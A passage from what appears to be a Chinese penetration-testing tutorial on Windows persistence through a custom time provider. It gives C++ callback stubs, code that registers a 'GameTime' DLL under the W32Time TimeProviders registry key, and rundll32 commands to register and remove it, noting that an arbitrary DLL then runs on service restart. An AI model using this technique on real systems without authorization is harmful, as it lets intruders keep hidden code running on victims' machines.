<p>根据Microsoft <a href="https://docs.microsoft.com/en-gb/windows/win32/sysinfo/creating-a-time-provider"target="_blank" rel="external nofollow noopener noreferrer">文档，</a>时间提供者必须实现以下回调函数。</p>
<ul>
<li>TimeProvOpen</li>
<li>TimeProvCommand</li>
<li>TimeProvClose</li>
</ul>
<p><strong>TimeProvOpen</strong>用于返回提供者句柄，<strong>TimeProvCommand</strong>用于将命令发送到时间提供者，而<strong>TimeProvClose</strong>用于关闭时间提供者。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#58a1dd">HRESULT</span> <span style="color:#ff636f">__stdcall</span> <span style="color:#58a1dd">TimeProvOpen</span>(
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">_In_</span>  <span style="color:#58a1dd">WCHAR</span>                <span style="color:#ff636f">*</span><span style="color:#58a1dd">wszName</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">_In_</span>  <span style="color:#58a1dd">TimeProvSysCallbacks</span> <span style="color:#ff636f">*</span><span style="color:#58a1dd">pSysCallbacks</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">_Out_</span> <span style="color:#58a1dd">TimeProvHandle</span>       <span style="color:#ff636f">*</span><span style="color:#58a1dd">phTimeProv</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">UNREFERENCED_PARAMETER</span>(<span style="color:#58a1dd">pSysCallbacks</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">UNREFERENCED_PARAMETER</span>(<span style="color:#58a1dd">phTimeProv</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">OutputDebugStringW</span>(<span style="color:#58a1dd">wszName</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">return</span> (<span style="color:#58a1dd">HRESULT_FROM_WIN32</span>(<span style="color:#58a1dd">ERROR_NOT_CAPABLE</span>));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">/*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"> *
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"> */</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">HRESULT</span> <span style="color:#ff636f">__stdcall</span> <span style="color:#58a1dd">TimeProvCommand</span>(
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">_In_</span> <span style="color:#58a1dd">TimeProvHandle</span> <span style="color:#58a1dd">hTimeProv</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">_In_</span> <span style="color:#58a1dd">TimeProvCmd</span>    <span style="color:#58a1dd">eCmd</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">_In_</span> <span style="color:#58a1dd">PVOID</span>          <span style="color:#58a1dd">pvArgs</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">UNREFERENCED_PARAMETER</span>(<span style="color:#58a1dd">hTimeProv</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">UNREFERENCED_PARAMETER</span>(<span style="color:#58a1dd">eCmd</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">UNREFERENCED_PARAMETER</span>(<span style="color:#58a1dd">pvArgs</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">return</span> (<span style="color:#58a1dd">HRESULT_FROM_WIN32</span>(<span style="color:#58a1dd">ERROR_NOT_CAPABLE</span>));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">/*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"> *
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"> */</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">HRESULT</span> <span style="color:#ff636f">__stdcall</span> <span style="color:#58a1dd">TimeProvClose</span>(
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">_In_</span> <span style="color:#58a1dd">TimeProvHandle</span> <span style="color:#58a1dd">hTimeProv</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">UNREFERENCED_PARAMETER</span>(<span style="color:#58a1dd">hTimeProv</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">return</span> (<span style="color:#58a1dd">S_OK</span>);
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111134750241-1284837023.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134750241-1284837023.png" alt="时间提供者–回调功能" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134750241-1284837023.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134750241-1284837023.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134750241-1284837023.png?size=large 2x" data-title="时间提供者–回调功能" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>GameTime提供程序将在系统上填充以下注册表项，因为它们是Microsoft时间提供程序规范的一部分。</p>
<ul>
<li>DllName,</li>
<li>Enabled</li>
<li>InputProvider</li>
</ul>
<p>该<strong>DLLNAME</strong>指示包含供应商，该DLL的名称<strong>启用</strong>使然是否提供商应在系统启动过程中启动。值“ 1”启动系统的提供者，而<strong>InputProvider</strong>指示提供者是输入还是输出。注册表值“ 1”表示已输入提供者。这些在下面的代码中指定：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#58a1dd">nRet</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">RegSetValueExW</span>(<span style="color:#58a1dd">hkTimeProvider</span>,
</span></span><span style="display:flex;"><span>                      <span style="color:#a6be9d">L</span><span style="color:#a6be9d">&#34;DllName&#34;</span>,
</span></span><span style="display:flex;"><span>                      <span style="color:#a6be9d">0</span>,
</span></span><span style="display:flex;"><span>                      <span style="color:#58a1dd">REG_SZ</span>,
</span></span><span style="display:flex;"><span>                      (<span style="color:#58a1dd">LPBYTE</span>)<span style="color:#58a1dd">g_wzModule</span>,
</span></span><span style="display:flex;"><span>                      (<span style="color:#58a1dd">DWORD</span>)<span style="color:#58a1dd">wcslen</span>(<span style="color:#58a1dd">g_wzModule</span>)<span style="color:#ff636f">*</span><span style="color:#ff636f">sizeof</span>(<span style="color:#58a1dd">WCHAR</span>)<span style="color:#ff636f">+</span><span style="color:#ff636f">sizeof</span>(<span style="color:#58a1dd">WCHAR</span>));
</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> (<span style="color:#58a1dd">ERROR_SUCCESS</span> <span style="color:#ff636f">!=</span> <span style="color:#58a1dd">nRet</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">OutputError</span>(<span style="color:#a6be9d">L</span><span style="color:#a6be9d">&#34;RegCreateKeyExW failed&#34;</span>, <span style="color:#58a1dd">nRet</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">goto</span> <span style="color:#58a1dd">ErrorExit</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">nRet</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">RegSetValueExW</span>(<span style="color:#58a1dd">hkTimeProvider</span>,
</span></span><span style="display:flex;"><span>                      <span style="color:#a6be9d">L</span><span style="color:#a6be9d">&#34;Enabled&#34;</span>,
</span></span><span style="display:flex;"><span>                      <span style="color:#a6be9d">0</span>,
</span></span><span style="display:flex;"><span>                      <span style="color:#58a1dd">REG_DWORD</span>,
</span></span><span style="display:flex;"><span>                      (<span style="color:#58a1dd">LPBYTE</span>)<span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">dwOne</span>,
</span></span><span style="display:flex;"><span>                      <span style="color:#ff636f">sizeof</span>(<span style="color:#58a1dd">dwOne</span>));
</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> (<span style="color:#58a1dd">ERROR_SUCCESS</span> <span style="color:#ff636f">!=</span> <span style="color:#58a1dd">nRet</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">OutputError</span>(<span style="color:#a6be9d">L</span><span style="color:#a6be9d">&#34;RegCreateKeyExW failed&#34;</span>, <span style="color:#58a1dd">nRet</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">goto</span> <span style="color:#58a1dd">ErrorExit</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">nRet</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">RegSetValueExW</span>(<span style="color:#58a1dd">hkTimeProvider</span>,
</span></span><span style="display:flex;"><span>                      <span style="color:#a6be9d">L</span><span style="color:#a6be9d">&#34;InputProvider&#34;</span>,
</span></span><span style="display:flex;"><span>                      <span style="color:#a6be9d">0</span>,
</span></span><span style="display:flex;"><span>                      <span style="color:#58a1dd">REG_DWORD</span>,
</span></span><span style="display:flex;"><span>                      (<span style="color:#58a1dd">LPBYTE</span>)<span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">dwOne</span>,
</span></span><span style="display:flex;"><span>                      <span style="color:#ff636f">sizeof</span>(<span style="color:#58a1dd">dwOne</span>));
</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> (<span style="color:#58a1dd">ERROR_SUCCESS</span> <span style="color:#ff636f">!=</span> <span style="color:#58a1dd">nRet</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">OutputError</span>(<span style="color:#a6be9d">L</span><span style="color:#a6be9d">&#34;RegCreateKeyExW failed&#34;</span>, <span style="color:#58a1dd">nRet</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">goto</span> <span style="color:#58a1dd">ErrorExit</span>;
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111134810603-1074824702.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134810603-1074824702.png" alt="时间提供者–注册表项值" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134810603-1074824702.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134810603-1074824702.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134810603-1074824702.png?size=large 2x" data-title="时间提供者–注册表项值" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>该代码还使用<strong>Deregister</strong>回调函数从系统中删除创建的注册表项<strong>GameTime</strong>，作为清理过程。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#58a1dd">HKEY_LOCAL_MACHINE</span>\<span style="color:#58a1dd">SYSTEM</span>\<span style="color:#58a1dd">CurrentControlSet</span>\<span style="color:#58a1dd">Services</span>\<span style="color:#58a1dd">W32Time</span>\<span style="color:#58a1dd">TimeProviders</span>\<span style="color:#58a1dd">GameTime</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">void</span> <span style="color:#58a1dd">CALLBACK</span> <span style="color:#58a1dd">Deregister</span>(
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">_In_</span> <span style="color:#58a1dd">HWND</span> <span style="color:#58a1dd">hWnd</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">_In_</span> <span style="color:#58a1dd">HINSTANCE</span> <span style="color:#58a1dd">hInst</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">_In_</span> <span style="color:#58a1dd">LPSTR</span> <span style="color:#58a1dd">pwzCmdLine</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">_In_</span> <span style="color:#ff636f">int</span> <span style="color:#58a1dd">nCmdShow</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">long</span>    <span style="color:#58a1dd">nRet</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">UNREFERENCED_PARAMETER</span>(<span style="color:#58a1dd">hWnd</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">UNREFERENCED_PARAMETER</span>(<span style="color:#58a1dd">hInst</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">UNREFERENCED_PARAMETER</span>(<span style="color:#58a1dd">pwzCmdLine</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">UNREFERENCED_PARAMETER</span>(<span style="color:#58a1dd">nCmdShow</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">OutputDebugStringW</span>(<span style="color:#a6be9d">L</span><span style="color:#a6be9d">&#34;Unregister</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">nRet</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">RegDeleteKeyW</span>(<span style="color:#58a1dd">HKEY_LOCAL_MACHINE</span>, <span style="color:#58a1dd">GAMETIME_SVC_KEY_NAME</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">ERROR_SUCCESS</span> <span style="color:#ff636f">!=</span> <span style="color:#58a1dd">nRet</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">OutputError</span>(<span style="color:#a6be9d">L</span><span style="color:#a6be9d">&#34;RegDeleteKeyW failed!&#34;</span>, <span style="color:#58a1dd">nRet</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">goto</span> <span style="color:#58a1dd">ErrorExit</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ErrorExit</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">return</span>;
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111135053322-1257398998.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111135053322-1257398998.png" alt="注销回调功能" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111135053322-1257398998.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111135053322-1257398998.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111135053322-1257398998.png?size=large 2x" data-title="注销回调功能" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>实际上，可以使用<strong>rundll32</strong>向系统注册DLL，以便创建关联的注册表项，默认情况下，该注册表项将与系统一起启用新的时间提供程序。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">rundll32</span>.<span style="color:#58a1dd">exe</span> <span style="color:#58a1dd">gametime</span>.<span style="color:#58a1dd">dll</span>,<span style="color:#58a1dd">Register</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111134844577-2033208265.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134844577-2033208265.png" alt="注册新的时间提供者" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134844577-2033208265.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134844577-2033208265.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134844577-2033208265.png?size=large 2x" data-title="注册新的时间提供者" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>将创建注册表项<strong>GameTime</strong>，并且<strong>DllName</strong>将包含DLL的路径。</p>
<p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111134901319-906395250.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134901319-906395250.png" alt="新时间提供商注册表项" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134901319-906395250.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134901319-906395250.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134901319-906395250.png?size=large 2x" data-title="新时间提供商注册表项" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>再次修改注册表以包含任意DLL，将在服务重新启动期间执行类似于Windows时间提供程序的代码。</p>
<p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111135132616-1441953181.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111135132616-1441953181.png" alt="新时间提供商注册表项修改" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111135132616-1441953181.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111135132616-1441953181.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111135132616-1441953181.png?size=large 2x" data-title="新时间提供商注册表项修改" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>该<strong>注销</strong>功能可用于删除所有相关联的密钥和系统上进行清理。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">rundll32</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">exe</span> <span style="color:#58a1dd">gametime</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">dll</span>,<span style="color:#58a1dd">Deregister</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111135146932-2098684535.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111135146932-2098684535.png" alt="img" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111135146932-2098684535.png?size=small, 